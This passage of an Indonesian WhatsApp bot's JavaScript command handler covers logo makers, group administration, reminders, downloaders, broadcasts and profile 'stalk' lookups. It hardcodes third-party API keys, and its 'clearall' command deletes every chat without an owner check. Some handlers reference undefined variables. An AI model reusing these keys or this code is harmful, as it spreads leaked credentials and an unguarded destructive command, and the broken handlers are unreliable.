                case 'text1917':
                case 'minion':
                case 'deluxesilver':
                case 'newyearcard':
                case 'bloodfrosted':
                case 'halloween':
                case 'jokerlogo':
                case 'fireworksparkle':
                case 'natureleaves':
                case 'bokeh':
                case 'toxic':
                case 'strawberry':
                case 'box3d':
                case 'roadwarning':
                case 'breakwall':
                case 'icecold':
                case 'luxury':
                case 'cloud':
                case 'summersand':
                case 'horrorblood':
                case 'thunder':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/textprome/${command}?apikey=${apikey}&text=${ini_txt}`).then((gambar) => {
                        syaa.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    break
                case 'pornhub':
                case 'glitch':
                case 'avenger':
                case 'space':
                case 'ninjalogo':
                case 'marvelstudio':
                case 'lionlogo':
                case 'wolflogo':
                case 'steel3d':
                case 'wallgravity':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/textprome2/${command}?apikey=${apikey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        syaa.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    break

                    // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${apikey}&text=${ini_txt}`).then((gambar) => {
                        syaa.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    break
                case 'tiktok':
                case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${apikey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        syaa.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    break

                    // Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                    if (args.length == 0) return reply(`Example: ${prefix + command} Iky Ganss`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey}&text=${ini_txt}`).then((gambar) => {
                        syaa.sendMessage(from, gambar, image, { quoted: mek })
                    })
                    break                  
	case "bcaudio":
					if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.audioMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, audio, {mimetype :  'audio/mp4' , duration : 359996400, ptt : true,quoted: ftroli})
						}
						reply('Suksess broadcast')
					}
					break
        case "bcgif":
					if (!isOwner && !mek.key.fromMe) return reply(mess.own)  
			        
					anu = await syaa.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						bc = await syaa.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							syaa.sendMessage(_.jid, bc, sticker, {mimetype: Mimetype.gif,quoted : ftroli})
						}
						reply('Suksess broadcast')
					}
					break
        case "clearall":
					
					anu = await syaa.chats.all()
					syaa.setMaxListeners(25)
					for (let _ of anu) {
						syaa.deleteChat(_.jid)
					}
					reply(ind.clears())
					break
					
      // Set Name Group
      case "setname":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        syaa.groupUpdateSubject(from, `${args.join(" ")}`);
        syaa.sendMessage(from, "Succes change name group", text, {
          quoted: mek,
        });
        break
      // Group Info
      case "groupinfo":
        case "infogrup":
          case "grupinfo":
            case "infogrup":
             
        if (!isGroup) return;
        ppUrl = await syaa.getProfilePicture(from); // leave empty to get your own
        buffergbl = await getBuffer(ppUrl);
        syaa.sendMessage(from, buffergbl, image, {
          quoted: mek,
          caption: `\`\`\`「 Group Info 」\`\`\`\n*•> *Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length} \n\n${groupDesc}`,
        });
        break;
        case 'infogrup':
          case 'infogc':
       case 'grupinfo':
       case 'groupinfo':
              if (!isGroup) return reply("Khusus di grup");
              try {
              var pic = await syaa.getProfilePicture(from)
              } catch {
              var pic = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
              let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length} \n\n${groupMetadata.desc}`
              syaa.sendMessage(from, await getBuffer(pic), image, {quoted: mek, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
              break
      // Demote Admins
      case "demote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        syaa.groupDemoteAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes demote`;
        syaa.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      // Promote Members
      case "promote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Reply members");
        mentionede = mek.message.extendedTextMessage.contextInfo.participant;
        syaa.groupMakeAdmin(from, [mentionede]);
        teks = `Members @${mentionede.split("@")[0]} succes promote`;
        syaa.sendMessage(from, teks, text, {
          quoted: mek,
          contextInfo: { mentionedJid: [mentionede] },
        });
        break;
      case "tutup":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        reply(`*SUCCES CLOSE GROUP*`);
        syaa.groupSettingChange(from, GroupSettingChange.messageSend, true);
        break;
      case "revoke":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        syaa.revokeInvite(from);
        reply("```Succes revoke link group```");
        break;
      case "buka":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Only admin");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        reply(`*SUCCES OPEN GROUP*`);
        syaa.groupSettingChange(from, GroupSettingChange.messageSend, false);
        break;
      case "reminder": // by Slavyan
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await syaa.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Text
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              syaa.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await syaa.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Sticker
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              syaa.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              syaa.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await syaa.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Image
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              syaa.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await syaa.downloadAndSaveMediaMessage(encmedia);
          await syaa.sendMessage(
            from,
            `── 「 REMINDER 」 ──
    
Reminder berhasil diaktifkan!
➸ Pesan: ${messRemind}
➸ Type: Audio
➸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
➸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              syaa.sendMessage(
                from,
                `── 「 REMINDER 」 ──

⏰ @${sender.split("@")[0]} ⏰
➸ Pesan: ${messRemind}
➸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              syaa.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        break;
      case "jadibot":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (mek.key.fromMe) return reply("Tidak bisa jadibot di dalam bot");
        jadibot(reply, syaa, from);
        break;
      case "stopjadibot":
        if (mek.key.fromMe)
          return reply("tidak bisa stopjadibot kecuali owner");
        stopjadibot(reply);
        break;
      case "listbot":
        let tekss = "「 *LIST JADIBOT* 」\n";
        for (let i of listjadibot) {
          tekss += `*Nomor* : ${i.jid.split("@")[0]}
*Nama* : ${i.name}
*Device* : ${i.phone.device_manufacturer}
*Model* : ${i.phone.device_model}\n\n`;
        }
        reply(tekss);
        break;

      //------------------< Fitur yg pake button >-------------------
      case "setprefix":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        sendButMessage(
          from,
          `PREFIX : ${prefixStatus ? "Multi Prefix" : "No Prefix"}`,
          `Silahkan pilih salah satu`,
          [
            {
              buttonId: `${prefix}noprefix`,
              buttonText: {
                displayText: `NOPREFIX`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}multiprefix`,
              buttonText: {
                displayText: `MULTIPREFIX`,
              },
              type: 1,
            },
          ]
        );
        break;
      case "mode":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        sendButMessage(from, `MODE SELF/PUBLIC`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
        break;
      case "grup":
        
        sendButMessage(from, `GROUP SETTING`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}buka`,
            buttonText: {
              displayText: `OPEN`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}tutup`,
            buttonText: {
              displayText: `CLOSE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}revoke`,
            buttonText: {
              displayText: `REVOKE INVITE`,
            },
            type: 1,
          },
        ]);
        break;
        case "scjojobot":
        reply(`https://youtu.be/1FZ1l1Cpbqs\n\nScript nya ada di dalam video itu`)
        break
        

      //------------------< Fitur downloader >-------------------
      case 'tiktoknowm':
				reply('loading...')
                    if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
                    ini_url = args[0]
                    ini_url = `https://bx-hunter.herokuapp.com/api/download/tiktok?url=${ini_url}&apikey=Ikyy69`
                    get_result = await fetchJson(ini_url)
                    ini_buffer = await getBuffer(bv.result.media_resources)
                    syaa.sendMessage(from, ini_buffer, video, { quoted: mek })
                    break
      case "tiktok":
        if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://bx-hunter.herokuapp.com/api/download/tiktok?url=${args[0]}/ZSJmhusyd/&apikey=Ikyy69`
        );
        var b = bv.result.author_metadata;
        var tamnel = await getBuffer(
          bv.result.media_resources.image.contentUrl
        );
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `⚜️ *Nickname*: ${b.username}\n❤️ *Like*: ${a.stats.diggCount}\n💬 *Komentar*: ${a.stats.commentCount}\n🔁 *Share*: ${a.stats.shareCount}\n🎞️ *Views*: ${a.stats.playCount}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}tiktokdl ${args[0]}|audio`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break;
        case "tiktokmp3":
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Link gak work')
 		if (!q) return reply('Linknya?')
 		reply('Tunggu bentar')
 		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { audio} = result
            sendMediaURL(from,audio,'')
    		})
     		.catch(e => console.log(e))
     		break
case 'tiktokvid':
 		if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Link gak valid')
 		if (!q) return reply('Linknya?')
 		reply("bentar")
		hx.ttdownloader(`${args[0]}`)
    		.then(result => {
    		const { wm, nowm, audio } = result
    		axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
    		.then(async (a) => {
    		me = `*Link* : ${a.data}`
		syaa.sendMessage(from,{url:`${nowm}`},video,{mimetype:'video/mp4',quoted:mek,caption:me})
		})
		})
     		.catch(e => console.log(e))
     		break

      case "youtube":
        if (!isPremium) return reply(mess.prem)
        if (!isUrl(args[0]) && !args[0].includes("youtu"))
          return reply(mess.Iv);
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/youtube/video?url=${args[0]}`
        );
        var b = bv.result.creator_metadata;
        var tamnel = await getBuffer(bv.result.media_resources.thumbnail);
        var a = bv.result.media_metadata;
        sendButImage(
          from,
          `*Name channel*: ${b.name}\n📜 *Title*: ${a.title}\n❤️ *Like*: ${a.totalLikes}\n👎 *Dislike*: ${a.totalDislikes}\n🎞️ *Views*: ${a.totalViews}`,
          `Silahkan pilih salah satu format yg mau didownload`,
          tamnel,
          [
            {
              buttonId: `${prefix}ytdl ${args[0]}|video`,
              buttonText: {
                displayText: `VIDEO`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}ytdl ${args[0]}|music`,
              buttonText: {
                displayText: `AUDIO`,
              },
              type: 1,
            },
          ]
        );
        break;
      //JCCHCCGHTHDTRSRS
      case "twitter":
        if (!isUrl(args[0]) && !args[0].includes("twitter.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        ten = args[0];
        var res = await hx.twitter(`${ten}`);
        ren = `${g.HD}`;
        sendMediaURL(from, ren, "DONE");
        break;
      case "facebook":
        if (!q) return reply("Linknya?");
        if (!isUrl(args[0]) && !args[0].includes("facebook.com"))
          return reply(mess.Iv);
        reply(mess.wait);
        te = args.join(" ");
        hx.fbdown(`${te}`).then((G) => {
          ten = `${G.HD}`;
          sendMediaURL(from, ten, `*Link video_normal* : ${G.Normal_video}`);
        });
        break;
        case "kuntul":
				        case "Kuntul":
				        case "Matamu":
				        case "matamu":
				        case "Matalo":
				        case "matalo":
				        case "pantek":
				        case "Pantek":
				        case "memek":
				        case "Memek":
       if (isBanned) return reply(mess.ban)
satu7 = fs.readFileSync('./30detik/toxic.mp3');
syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})
break

      case "instagram":
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return fakegroup("Linknya?");
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "tiktokdl":
        if (!isPremium) return reply(mess.prem)
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${link}`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
        }
        break;
      case "ytdl":
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/youtube/${tipe}?url=${link}`
        );
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.videoUrl, "");
        }
        if (tipe == "music") {
          sendMediaURL(from, bv.result.media_resources.musicUrl, "");
        }
        break;

      case "noprefix":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (prefixStatus == false) return reply("No prefix is recently on!");
        prefixStatus = false;
        reply("Berhasil mengganti prefix menjadi noprefix");
        break;
      case "multiprefix":
        if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (prefixStatus == true) return reply("Multi prefix is recently on!");
        prefixStatus = true;
        reply("Berhasil mengganti prefix menjadi multiprefix");
        break;

      case "delvote":
        if (!mek.key.remoteJid) return;
        if (isVote) return reply("Tidak ada sesi Voting");
        delVote(from);
        reply("Sukses Menghapus sesi Voting Di Grup Ini");
        break;
      case "voting":
        if (!isGroupAdmins && !mek.key.fromMe) return;
        if (!isGroup) return reply(mess.only.group);
        if (isVote) return reply("Sesi Voting Sedang Berlangsung Di Grup Ini");
        if (!q)
          return reply(
            "*Voting*\n\n" +
              prefix +
              "voting @tag target | reason  | 1 (1 = 1 Menit)"
          );
        if (
          mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          mek.message.extendedTextMessage.contextInfo == null
        ) {
          let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(" ").replace("@", "").split("|");
          if (!Number(split[2]))
            return reply(
              "masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"
            );
          await mentions(
            "Vote " +
              "@" +
              id.split("@")[0] +
              " Di Mulai" +
              "\n\n" +
              `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
            case "bot":
            case "Bot":
            case "BOT":
            case "oy":
            case "pe":
            case "Oy":
            case "Pe":
          if (isBanned) return reply(mess.ban)
            satu7 = fs.readFileSync('./30detik/bot.mp3');
            syaa.sendMessage(from, satu7, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

            break
           
      case "linkwa":
        if (!q) return reply("cari group apa?");
        hx.linkwa(q).then((result) => {
          let res = "*「 _LINK WA_ 」*\n\n";
          for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
      
      case "githubstalk":
        if (!q) return reply("Usernamenya?");
        const oi = await fetchJson(
          `https://api.dhnjing.xyz/stalk/github?user=dehan-j1ng`
        );
        const mm = `*GITHUB STALK*
    Username: ${oi.result.username}
    Fullname: ${oi.result.name}
    Bio: ${oi.result.user_bio}

    Jumlah repo: ${oi.result.user_repo}
    Following: ${oi.result.user_following}
    Follower: ${oi.result.user_followers}`;
        reply(mm);
        break;
      case "tiktokstalk":
        if (!q) return reply("Usernamenya? ");
        var i = await fetchJson(
          `https://api.dhnjing.xyz/stalk/tiktok?user=@${q}`
        );
        buff = await getBuffer(i.result.user.avatarLarger);
        var ii = `*TIKTOK STALK*
    Username: ${q}
    Nickname: ${i.result.user.nickname}
    Bio: ${i.result.user.signature}

    Jumlah postingan: ${i.result.stats.videoCount}
    Following: ${i.result.stats.followingCount}
    Follower: ${i.result.stats.followerCount}`;
        syaa.sendMessage(from, buff, image, { quoted: mek, caption: ii });
        break;
      case "igstory":
        if (!q) return reply("Usernamenya?");
        hx.igstory(q).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              syaa.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "colongsw": //arif
        if (!mek.key.fromMe) return;
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await syaa.downloadAndSaveMediaMessage(ger);
          syaa.sendMessage(from, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !mek.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          owgi = await syaa.downloadAndSaveMediaMessage(ger);
          syaa.sendMessage(from, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong");
        }
        break;
      case "tulis":
        if (args.length < 1)
          return reply(
            `Usage: ${prefix + command} nama&kelas&nomor absen&kata\n*Example*: ${
              prefix + command
            } udin&20&17&blablabla`
          );
        var bodi = args.join(" ");
        var nama = bodi.split("&")[0];
        var kelas = bodi.split("&")[1];
        var no = bodi.split("&")[2];
        var aksarane = bodi.split("&")[3];
        reply("membuat bos...");
        rakz = await getBuffer(
          `https://zekais-api.herokuapp.com/bukukiri?text=${bodi}&apikey=owLeb2QL`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;

      case "card-game":
        if ((isMedia && !mek.message.videoMessage) || isQuotedImage) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          //  console.log(ted)
          var bodi = args.join(" ");
          var nama = bodi.split("|")[0];
          var kelas = bodi.split("|")[1];
          reply("Loading.....");
          owgi = await syaa.downloadAndSaveMediaMessage(ted);
          console.log(owgi);
          anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi);
          console.log(anu);
          //reply (anu)

          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/card-game?nama=${nama}&desc=${kelas}&picurl=${anu.display_url}`
          );
          syaa.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        } else {
          reply(
            `Kirim gambar atau tag gambar yang sudah dikirim lalu  dengan caption ${prefix}card-game nama|teks keterangan `
          );
        }
        break;

      case "sertiff1":
        pll = body.slice(10);
        if (args.length < 1) return reply(prefix);
        reply("Loading.....");
        rakz = await getBuffer(
          `https://fdz-app.herokuapp.com/api/maker/sertif-ff-v1?text=${pll}`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;
      case "bpink":
        pll = body.slice(7);

        if (args.length < 1) return reply(preffk);
        reply("Loading.....");
        rakz = await getBuffer(
          `https://fdz-app.herokuapp.com/api/maker/blackpink?text=${pll}`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;
        case "alam1":
        pll = body.slice(7);
        if (args.length < 1) return reply(preffk);
        reply("Loading.....");
        rakz = await getBuffer(
          `https://rest-api-megumin1.herokuapp.com/api/textmaker/alam?text=${pll}&theme=summer&apikey=Alphabot`
        );
        syaa.sendMessage(from, rakz, image, {
          quoted: mek,
          thumbnail: Buffer.alloc(0),
        });
        break;

      case "wanted":
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
